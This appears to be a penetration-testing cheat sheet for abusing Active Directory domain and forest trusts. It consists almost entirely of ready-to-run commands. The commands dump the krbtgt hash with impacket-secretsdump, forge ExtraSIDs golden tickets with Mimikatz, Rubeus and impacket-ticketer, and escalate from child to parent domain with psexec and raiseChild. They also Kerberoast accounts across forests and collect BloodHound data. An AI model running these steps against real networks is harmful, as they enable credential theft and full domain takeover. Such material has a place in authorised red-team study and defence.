### Enumeration - Windows
```
Import-Module activedirectory
Get-ADTrust -Filter *
Get-DomainTrust

Import-Module .\PowerView.ps1
Get-DomainTrustMapping

netdom query /domain:<DOMAIN> trust
netdom query /domain:<DOMAIN> dc
netdom query /domain:<DOMAIN> workstation
```
### Windows Attacks
#### ExtraSIDs - Mimikatz (Golden Ticket)
```
Get-DomainSID
Get-DomainGroup -Domain <DOMAIN> -Identity "<GROUP>" | select distinguishedname,objectsid	
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /sids:<SIDS> /ptt
klist
```
#### ExtraSIDs - Rubeus (Golden Ticket)
```
Get-DomainSID
Get-DomainGroup -Domain <DOMAIN> -Identity "<GROUP>" | select distinguishedname,objectsid
.\Rubeus.exe golden /rc4:<HASH> /domain:<DOMAIN> /sid:<SID>  /sids:<SIDS> /user:<USER> /ptt
klist
```
### Linux Attacks
#### ExtraSIDs - impacket-ticketer (Golden Ticket)
```
impacket-secretsdump <DOMAIN>/<USER>@<IP> -just-dc-user <DOMAIN>/krbtgt
impacket-lookupsid <DOMAIN>/<USER>@<IP>
impacket-ticketer -nthash <HASH> -domain <DOMAIN> -domain-sid <SID> -extra-sid <SID> <USER>
export KRB5CCNAME=<USER>.ccache
impacket-psexec <DOMAIN>/<USER>@<DC_HOSTNAME> -k -no-pass -target-ip <DC_IP>

#Automated child->parent domain escalation
impacket-raiseChild -target-exec <DC_IP> <DOMAIN>/<USER>
```
### Cross-Forest Trust Abuse
#### Windows - Kerberoasting
```
Get-DomainUser -SPN -Domain <DOMAIN> | select SamAccountName
et-DomainUser -Domain <DOMAIN> -Identity <USER> |select samaccountname,memberof
.\Rubeus.exe kerberoast /domain:<DOMAIN> /user:<USER> /nowrap
```
#### Linux - Kerberoasting
```
impacket-GetUserSPNs -target-domain <DOMAIN> <DOMAIN>/<USER>
impacket-GetUserSPNs -request -target-domain <DOMAIN> <DOMAIN>/<USER>
```
#### Foreign Domain Membership
```
#Windows
Get-DomainForeignGroupMember -Domain <DOMAIN>
Convert-SidToName <SID>
Enter-PSSession -ComputerName <DC_HOSTNAME> -Credential <DOMAIN>/<USER>

#Linux
bloodhound-python -d <DOMAIN> -dc <HOSTNAME> -c All -u <USER> -p <PASS>
zip -r <FILENAME>.zip *.json
```